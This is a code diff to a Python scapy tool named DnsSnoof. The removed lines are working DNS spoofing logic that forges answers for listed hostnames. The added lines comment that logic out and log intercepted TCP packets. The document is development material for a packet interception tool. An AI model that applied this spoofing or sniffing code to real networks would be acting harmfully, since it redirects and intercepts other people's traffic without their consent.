@@ -24,21 +24,21 @@ class DnsSnoof:
   
     def callBack(self, packet):
         scapyPacket = IP(packet.get_payload())
-        if scapyPacket.haslayer(DNSRR):
+        if scapyPacket.haslayer(TCP):
             try:
-                log.info(f'[original] { scapyPacket[DNSRR].summary()}')
-                queryName = scapyPacket[DNSQR].qname
-                if queryName in self.hostDict:
-                    scapyPacket[DNS].an = DNSRR(
-                        rrname=queryName, rdata=self.hostDict[queryName])
-                    scapyPacket[DNS].ancount = 1
-                    del scapyPacket[IP].len
-                    del scapyPacket[IP].chksum
-                    del scapyPacket[UDP].len
-                    del scapyPacket[UDP].chksum
-                    log.info(f'[modified] {scapyPacket[DNSRR].summary()}')
-                else:
-                    log.info(f'[not modified] { scapyPacket[DNSRR].rdata }')
+                log.info(f'[original] { scapyPacket[TCP].show()}')
+                #queryName = scapyPacket[DNSQR].qname
+                #if queryName in self.hostDict:
+                    #scapyPacket[DNS].an = DNSRR(
+                        #rrname=queryName, rdata=self.hostDict[queryName])
+                    #scapyPacket[DNS].ancount = 1
+                    #del scapyPacket[IP].len
+                    #del scapyPacket[IP].chksum
+                    #del scapyPacket[UDP].len
+                    #del scapyPacket[UDP].chksum
+                    #log.info(f'[modified] {scapyPacket[DNSRR].summary()}')
+                #else:
+                    #log.info(f'[not modified] { scapyPacket[DNSRR].rdata }')
             except IndexError as error:
                 log.error(error)
             packet.set_payload(bytes(scapyPacket))
